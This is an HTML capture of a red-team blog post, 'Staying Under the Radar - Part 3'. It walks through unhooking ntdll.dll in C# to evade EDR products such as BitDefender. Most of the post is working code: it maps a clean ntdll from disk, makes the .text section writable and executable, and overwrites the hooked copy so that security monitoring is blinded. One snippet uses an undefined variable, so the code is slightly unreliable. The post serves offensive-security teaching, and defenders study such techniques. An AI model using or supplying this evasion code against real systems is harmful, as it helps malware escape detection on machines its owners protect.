<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Staying Under the Radar - Part 3 - Unhooking DLLs" /><meta name="author" content="crypt0ace" /><meta property="og:locale" content="en" /><meta name="description" content="Unhooking DLLS in C#" /><meta property="og:description" content="Unhooking DLLS in C#" /><link rel="canonical" href="https://crypt0ace.github.io/posts/Staying-under-the-Radar-Part-3/" /><meta property="og:url" content="https://crypt0ace.github.io/posts/Staying-under-the-Radar-Part-3/" /><meta property="og:site_name" content="Crypt0ace" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-09-24T00:00:00+05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Staying Under the Radar - Part 3 - Unhooking DLLs" /><meta name="twitter:site" content="@crypt0acee" /><meta name="twitter:creator" content="@crypt0ace" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"crypt0ace"},"dateModified":"2022-09-24T00:00:00+05:00","datePublished":"2022-09-24T00:00:00+05:00","description":"Unhooking DLLS in C#","headline":"Staying Under the Radar - Part 3 - Unhooking DLLs","mainEntityOfPage":{"@type":"WebPage","@id":"https://crypt0ace.github.io/posts/Staying-under-the-Radar-Part-3/"},"url":"https://crypt0ace.github.io/posts/Staying-under-the-Radar-Part-3/"}</script><title>Staying Under the Radar - Part 3 - Unhooking DLLs | Crypt0ace</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Crypt0ace"><meta name="application-name" content="Crypt0ace"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/avatar/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Crypt0ace</a></div><div class="site-subtitle font-italic">A Cybersecurity Blog by Ahmed Sher</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/crypt0ace" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/crypt0acee" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['ahmedsherfreelance','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://www.linkedin.com/in/ahmed-sher-93234a206/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Staying Under the Radar - Part 3 - Unhooking DLLs</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Staying Under the Radar - Part 3 - Unhooking DLLs</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1663959600" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Sep 24, 2022 </em> </span><div class="d-flex justify-content-between"> <span> By <em> Ahmed Sher </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1273 words"> <em>7 min</em> read</span></div></div></div><div class="post-content"><h2 id="introduction"><span class="mr-2">Introduction</span><a href="#introduction" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>In this post we will look into how we can manually unhook DLLs that are attached by the EDRs. We can do this by swiping out the hooked version of <code class="language-plaintext highlighter-rouge">ntdll.dll</code>, the DLL to which all the function calls are eventually passed on before the syscall is made, with a new clean version.</p><h2 id="endpoint-detection-and-response"><span class="mr-2">Endpoint Detection and Response</span><a href="#endpoint-detection-and-response" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>EDRs or Endpoint Detection and Response are security solutions that organizations deploy to protect their infrastructure from malicious attacks by detecting them and responding to them. According to CrowdStrike, <em>Using EDR, the threat hunters work proactively to hunt, investigate and advise on threat activity in your environment. When they find a threat, they work alongside your team to triage, investigate and remediate the incident, before it has the chance to become a full-blown breach.</em></p><h2 id="userland-hooks"><span class="mr-2">Userland Hooks</span><a href="#userland-hooks" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>A usual way EDRs detect behaviour of a program is by the process of <em>hooking</em>. What this means is that the EDRs will inject into a running process and monitor the use of API calls. Some of these API calls are considered malicious due to high usage of them in malicious programs. They can be <em>VirtualAlloc</em>, <em>QueueUserAPC</em>, <em>CreateRemoteThread</em>, etc. <br /> An example of this has previously been discussed in <a href="https://crypt0ace.github.io/posts/Staying-under-the-Radar/">Part 1</a> where we saw how BitDefender hooked into our process to look for malicious activity.</p><h2 id="identifying-hooks"><span class="mr-2">Identifying Hooks</span><a href="#identifying-hooks" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We can identify hooks if we follow execution of a process in a debugger. For this demonstration, I’m using x64Dbg. Once we load a program in the debugger we can go over to symbols and look for <code class="language-plaintext highlighter-rouge">ntdll.dll</code>. Clicking on it should give us a list of exports it has. This will contain a list of APIs that we can look. <br /> <img data-src="/assets/img/staying-under-the-radar-3/functions.png" alt="API Calls from NTDLL" data-proofer-ignore> <br /> In this demonstration I will be using <code class="language-plaintext highlighter-rouge">NtCreateProcess</code>. We can find it in the list and then double click it to see it in disassembler. We can observe a <code class="language-plaintext highlighter-rouge">JMP</code> instruction happening. That <code class="language-plaintext highlighter-rouge">JMP</code> instruction would take us the the DLL of BitDefender. <br /> <img data-src="/assets/img/staying-under-the-radar-3/with-edr.png" alt="BitDefender Hook" data-proofer-ignore> <br /> In comparison, if we look at this the same way from a machine that does not have BitDefender we see that the <code class="language-plaintext highlighter-rouge">JMP</code> instruction is not present anymore. <br /> <img data-src="/assets/img/staying-under-the-radar-3/without-edr.png" alt="No Hooks" data-proofer-ignore> <br /></p><h2 id="unhooking"><span class="mr-2">Unhooking</span><a href="#unhooking" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="imports"><span class="mr-2">Imports</span><a href="#imports" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We can start with importing some API calls that we would need to do this. There’s a number of API calls all mentioned below and taken from Microsoft Docs and PInvoke.</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"psapi.dll"</span><span class="p">,</span> <span class="n">SetLastError</span> <span class="p">=</span> <span class="k">true</span><span class="p">)]</span>
<span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="kt">bool</span> <span class="nf">GetModuleInformation</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">hModule</span><span class="p">,</span> <span class="k">out</span> <span class="n">MODULEINFO</span> <span class="n">lpmodinfo</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">cb</span><span class="p">);</span>

<span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">,</span> <span class="n">SetLastError</span> <span class="p">=</span> <span class="k">true</span><span class="p">)]</span>
<span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="n">IntPtr</span> <span class="nf">CreateFileA</span><span class="p">(</span><span class="kt">string</span> <span class="n">lpFileName</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">dwDesiredAccess</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">dwShareMode</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpSecurityAttributes</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">dwCreationDisposition</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">dwFlagsAndAttributes</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">hTemplateFile</span><span class="p">);</span>

<span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">)]</span>
<span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="n">IntPtr</span> <span class="nf">GetCurrentProcess</span><span class="p">();</span>

<span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">,</span> <span class="n">CharSet</span> <span class="p">=</span> <span class="n">CharSet</span><span class="p">.</span><span class="n">Auto</span><span class="p">)]</span>
<span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="n">IntPtr</span> <span class="nf">GetModuleHandle</span><span class="p">(</span><span class="kt">string</span> <span class="n">lpModuleName</span><span class="p">);</span>

<span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">,</span> <span class="n">SetLastError</span> <span class="p">=</span> <span class="k">true</span><span class="p">,</span> <span class="n">CharSet</span> <span class="p">=</span> <span class="n">CharSet</span><span class="p">.</span><span class="n">Auto</span><span class="p">)]</span>
<span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="n">IntPtr</span> <span class="nf">CreateFileMapping</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">hFile</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpFileMappingAttributes</span><span class="p">,</span> <span class="n">PageProtection</span> <span class="n">flProtect</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">dwMaximumSizeHigh</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">dwMaximumSizeLow</span><span class="p">,</span> <span class="kt">string</span> <span class="n">lpName</span><span class="p">);</span>

<span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">)]</span>
<span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="n">IntPtr</span> <span class="nf">MapViewOfFile</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">hFileMappingObject</span><span class="p">,</span> <span class="n">FileMapAccessType</span> <span class="n">dwDesiredAccess</span><span class="p">,</span> <span class="n">UInt32</span> <span class="n">dwFileOffsetHigh</span><span class="p">,</span> <span class="n">UInt32</span> <span class="n">dwFileOffsetLow</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">dwNumberOfBytesToMap</span><span class="p">);</span>

<span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">)]</span>
<span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="kt">int</span> <span class="nf">VirtualProtect</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">lpAddress</span><span class="p">,</span> <span class="n">UInt32</span> <span class="n">dwSize</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">flNewProtect</span><span class="p">,</span> <span class="k">out</span> <span class="kt">uint</span> <span class="n">lpflOldProtect</span><span class="p">);</span>

<span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"msvcrt.dll"</span><span class="p">,</span> <span class="n">SetLastError</span> <span class="p">=</span> <span class="k">false</span><span class="p">)]</span>
<span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="n">IntPtr</span> <span class="nf">memcpy</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">dest</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">src</span><span class="p">,</span> <span class="n">UInt32</span> <span class="n">count</span><span class="p">);</span>

<span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">,</span> <span class="n">SetLastError</span> <span class="p">=</span> <span class="k">true</span><span class="p">)]</span>
<span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="kt">bool</span> <span class="nf">CloseHandle</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">hObject</span><span class="p">);</span>

<span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">,</span> <span class="n">SetLastError</span> <span class="p">=</span> <span class="k">true</span><span class="p">)]</span>
<span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="kt">bool</span> <span class="nf">FreeLibrary</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">hModule</span><span class="p">);</span>
</pre></table></code></div></div><p>We also need some structs but instead of pasting all of them here you can visit the github <a href="https://github.com/crypt0ace/CS-Unhook">here</a> to look at all the code.</p><h3 id="main-method"><span class="mr-2">Main Method</span><a href="#main-method" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>First we need to get the current process’s handle. We can get that using <code class="language-plaintext highlighter-rouge">GetCurrentProcess</code> API.</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">IntPtr</span> <span class="n">currentProcessHandle</span> <span class="p">=</span> <span class="nf">GetCurrentProcess</span><span class="p">();</span>
</pre></table></code></div></div><p>Then we can initialize <code class="language-plaintext highlighter-rouge">MODULEINFO</code>. We need to get a handle to the <code class="language-plaintext highlighter-rouge">NTDLL.dll</code> that is currently loaded and is being hooked by BitDefender. We can use <code class="language-plaintext highlighter-rouge">GetModuleHhandle</code> for this. Next we need to use <code class="language-plaintext highlighter-rouge">GetModuleInformation</code> with the current process handle and the DLL Handle to retrieve the information from <code class="language-plaintext highlighter-rouge">MODULEINFO</code> struct. This information will be <code class="language-plaintext highlighter-rouge">lpBaseOfDll</code> to get the base address of <code class="language-plaintext highlighter-rouge">NTDLL.dll</code></p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="n">MODULEINFO</span> <span class="n">modInfo</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">MODULEINFO</span><span class="p">();</span>
<span class="n">IntPtr</span> <span class="n">dllHandle</span> <span class="p">=</span> <span class="nf">GetModuleHandle</span><span class="p">(</span><span class="s">"ntdll.dll"</span><span class="p">);</span>
<span class="nf">GetModuleInformation</span><span class="p">(</span><span class="n">currentProcessHandle</span><span class="p">,</span> <span class="n">dllHandle</span><span class="p">,</span> <span class="k">out</span> <span class="n">modInfo</span><span class="p">,</span> <span class="p">(</span><span class="kt">uint</span><span class="p">)</span><span class="n">Marshal</span><span class="p">.</span><span class="nf">SizeOf</span><span class="p">(</span><span class="n">modInfo</span><span class="p">));</span>
<span class="n">IntPtr</span> <span class="n">dllBase</span> <span class="p">=</span> <span class="n">modInfo</span><span class="p">.</span><span class="n">lpBaseOfDll</span><span class="p">;</span>
</pre></table></code></div></div><p>After this we can start mapping a fresh copy of <code class="language-plaintext highlighter-rouge">NTDLL.dll</code> from disk. First we will get a handle of the fresh <code class="language-plaintext highlighter-rouge">NTDLL.dll</code> using <code class="language-plaintext highlighter-rouge">CreateFileA</code> with read access. Next we are going to use <code class="language-plaintext highlighter-rouge">CreateFileMapping</code> to create mapping of the specified DLL. Then we can map the DLL into memory using <code class="language-plaintext highlighter-rouge">MapViewOfFile</code> providing it the mapping and opening it with read access.</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="kt">string</span> <span class="n">fileName</span> <span class="p">=</span> <span class="s">"C:\\Windows\\System32\\ntdll.dll"</span><span class="p">;</span>
<span class="n">IntPtr</span> <span class="n">ntdllHandle</span> <span class="p">=</span> <span class="nf">CreateFileA</span><span class="p">(</span><span class="n">ntdll</span><span class="p">,</span> <span class="n">GENERIC_READ</span><span class="p">,</span> <span class="n">FILE_SHARE_READ</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">);</span>
<span class="n">IntPtr</span> <span class="n">ntdllMapping</span> <span class="p">=</span> <span class="nf">CreateFileMapping</span><span class="p">(</span><span class="n">ntdllHandle</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="n">PageProtection</span><span class="p">.</span><span class="n">Readonly</span> <span class="p">|</span> <span class="n">PageProtection</span><span class="p">.</span><span class="n">SectionImage</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
<span class="n">IntPtr</span> <span class="n">ntdllMmapped</span> <span class="p">=</span> <span class="nf">MapViewOfFile</span><span class="p">(</span><span class="n">ntdllMapping</span><span class="p">,</span> <span class="n">FileMapAccessType</span><span class="p">.</span><span class="n">Read</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">);</span>
</pre></table></code></div></div><p>Next we get a pointer to the DOS Header from the DLL Base Address using <code class="language-plaintext highlighter-rouge">Marshal.PtrToStructure</code>. We can get a pointer to the NT Header structure by adding the Base Address of the DLL to <code class="language-plaintext highlighter-rouge">e_lfanew</code> which is a pointer to PE Header.</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">IMAGE_DOS_HEADER</span> <span class="n">dosHeader</span> <span class="p">=</span> <span class="p">(</span><span class="n">IMAGE_DOS_HEADER</span><span class="p">)</span><span class="n">Marshal</span><span class="p">.</span><span class="nf">PtrToStructure</span><span class="p">(</span><span class="n">dllBase</span><span class="p">,</span> <span class="k">typeof</span><span class="p">(</span><span class="n">IMAGE_DOS_HEADER</span><span class="p">));</span>
<span class="n">IntPtr</span> <span class="n">ptrtoNTHeader</span> <span class="p">=</span> <span class="p">(</span><span class="n">dllBase</span> <span class="p">+</span> <span class="n">dosHeader</span><span class="p">.</span><span class="n">e_lfanew</span><span class="p">);</span>
<span class="n">IMAGE_NT_HEADERS64</span> <span class="n">ntHeader</span> <span class="p">=</span> <span class="p">(</span><span class="n">IMAGE_NT_HEADERS64</span><span class="p">)</span><span class="n">Marshal</span><span class="p">.</span><span class="nf">PtrToStructure</span><span class="p">(</span><span class="n">ptrtoNTHeader</span><span class="p">,</span> <span class="k">typeof</span><span class="p">(</span><span class="n">IMAGE_NT_HEADERS64</span><span class="p">));</span>
</pre></table></code></div></div><p>After getting these values we can now check the sections. The section that we are interested in is the <code class="language-plaintext highlighter-rouge">.text</code> section because thats the one that holds all the executeable code. This also where our DLL will reside. So to overwrite the old DLL with our new DLL we are going to loop through the section names and try to find the <code class="language-plaintext highlighter-rouge">.text</code> one. <br /> The number of sections are retrieved by using <code class="language-plaintext highlighter-rouge">ntHeader.FileHeader.NumberOfSections</code>. We need to locate the Section Header so we can retreive the names of the sections. We need to loop through all the sections and get a pointer to the Section Header. That way we can easily call the name of the sections using <code class="language-plaintext highlighter-rouge">sectionHeader.Name</code>.</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span> <span class="n">i</span> <span class="p">&lt;</span> <span class="n">ntHeader</span><span class="p">.</span><span class="n">FileHeader</span><span class="p">.</span><span class="n">NumberOfSections</span><span class="p">;</span> <span class="n">i</span><span class="p">++)</span>
<span class="p">{</span>
  <span class="n">IntPtr</span> <span class="n">ptrtoSectionHeader</span> <span class="p">=</span> <span class="p">(</span><span class="n">ptrtoNTHeader</span> <span class="p">+</span> <span class="n">Marshal</span><span class="p">.</span><span class="nf">SizeOf</span><span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="n">IMAGE_NT_HEADERS64</span><span class="p">)));</span>
  <span class="n">IMAGE_SECTION_HEADER</span> <span class="n">sectionHeader</span> <span class="p">=</span> <span class="p">(</span><span class="n">IMAGE_SECTION_HEADER</span><span class="p">)</span><span class="n">Marshal</span><span class="p">.</span><span class="nf">PtrToStructure</span><span class="p">((</span><span class="n">ptrtoSectionHeader</span> <span class="p">+</span> <span class="p">(</span><span class="n">i</span> <span class="p">*</span> <span class="n">Marshal</span><span class="p">.</span><span class="nf">SizeOf</span><span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="n">IMAGE_SECTION_HEADER</span><span class="p">)))),</span> <span class="k">typeof</span><span class="p">(</span><span class="n">IMAGE_SECTION_HEADER</span><span class="p">));</span>
  <span class="kt">string</span> <span class="n">sectionName</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">string</span><span class="p">(</span><span class="n">sectionHeader</span><span class="p">.</span><span class="n">Name</span><span class="p">);</span>
  <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="n">sectionName</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Now we need to use a for loop as if the section name contains <code class="language-plaintext highlighter-rouge">.text</code>, we can proceed with the code. We start by using <code class="language-plaintext highlighter-rouge">IntPtr.Add</code> to add the offset of the first byte of the section to the DLL Base Address. This will be the old hooked DLL address. Then we are going to do the same with the new DLL that we have mapped as well. <br /> After this the actual change happens. We are going to use <code class="language-plaintext highlighter-rouge">VirtualProtect</code> to change the protection of the <code class="language-plaintext highlighter-rouge">.text</code> section to RWX. Then we use <code class="language-plaintext highlighter-rouge">memcpy</code> to overwrite the old DLL with the new one. And then change the protection back.</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="k">if</span> <span class="p">(</span><span class="n">sectionName</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="s">".text"</span><span class="p">))</span>
<span class="p">{</span>
  <span class="kt">uint</span> <span class="n">oldProtect</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span>
  <span class="n">IntPtr</span> <span class="n">oldAddress</span> <span class="p">=</span> <span class="n">IntPtr</span><span class="p">.</span><span class="nf">Add</span><span class="p">(</span><span class="n">dllBase</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">sectionHeader</span><span class="p">.</span><span class="n">VirtualAddress</span><span class="p">);</span>
  <span class="n">IntPtr</span> <span class="n">newAddress</span> <span class="p">=</span> <span class="n">IntPtr</span><span class="p">.</span><span class="nf">Add</span><span class="p">(</span><span class="n">ntdllMmapped</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">sectionHeader</span><span class="p">.</span><span class="n">VirtualAddress</span><span class="p">);</span>
  <span class="kt">int</span> <span class="n">vProtect</span> <span class="p">=</span> <span class="nf">VirtualProtect</span><span class="p">(</span><span class="n">oldAddress</span><span class="p">,</span> <span class="n">sectionHeader</span><span class="p">.</span><span class="n">VirtualSize</span><span class="p">,</span> <span class="m">0x40</span><span class="p">,</span> <span class="k">out</span> <span class="n">oldProtect</span><span class="p">);</span>
  <span class="nf">memcpy</span><span class="p">(</span><span class="n">oldAddress</span><span class="p">,</span> <span class="n">newAddress</span><span class="p">,</span> <span class="n">sectionHeader</span><span class="p">.</span><span class="n">VirtualSize</span><span class="p">);</span>
  <span class="n">vProtect</span> <span class="p">=</span> <span class="nf">VirtualProtect</span><span class="p">(</span><span class="n">oldAddress</span><span class="p">,</span> <span class="n">sectionHeader</span><span class="p">.</span><span class="n">VirtualSize</span><span class="p">,</span> <span class="n">oldProtect</span><span class="p">,</span> <span class="k">out</span> <span class="n">oldProtect</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>When this is done, the function should be able to swipe the hooked DLL with a new fresh one which is not hooked. <img data-src="/assets/img/staying-under-the-radar-3/after-unhooking.png" alt="Clean NTDLL" data-proofer-ignore></p><h2 id="code"><span class="mr-2">Code</span><a href="#code" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The code can be found on my github <a href="https://github.com/crypt0ace/CS-Unhook">here</a>.</p><h2 id="conclusion"><span class="mr-2">Conclusion</span><a href="#conclusion" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>As always this code is not perfect. EDRs or AVs might catch and burn this as soon as it hits the disk. EDRs and AVs are constantly updating and getting better at what they do so as everyone always says <em>Its just a game of cat and mouse</em>.</p><h2 id="references"><span class="mr-2">References</span><a href="#references" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>All credits to these posts and codes</p><ul><li><a href="https://makosecblog.com/malware-dev/dll-unhooking-csharp/">DLL Unhooking C# - MakosecBlog</a><li><a href="https://github.com/Kara-4search/FullDLLUnhooking_CSharp/blob/main/FullDLLUnhooking/Program.cs">Full DLL Unhooking - Kara-4search</a><li><a href="https://github.com/GetRektBoy724/SharpUnhooker">SharpUnhooker - GetRektBoy724</a><li><a href="https://depthsecurity.com/blog/classic-api-unhooking-to-bypass-edr-solutions">Classic API Unhooking to Bypass EDR Solutions - DepthSecurity</a></ul></div><div class="post-tail-wrapper text-muted"><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/red-team/" 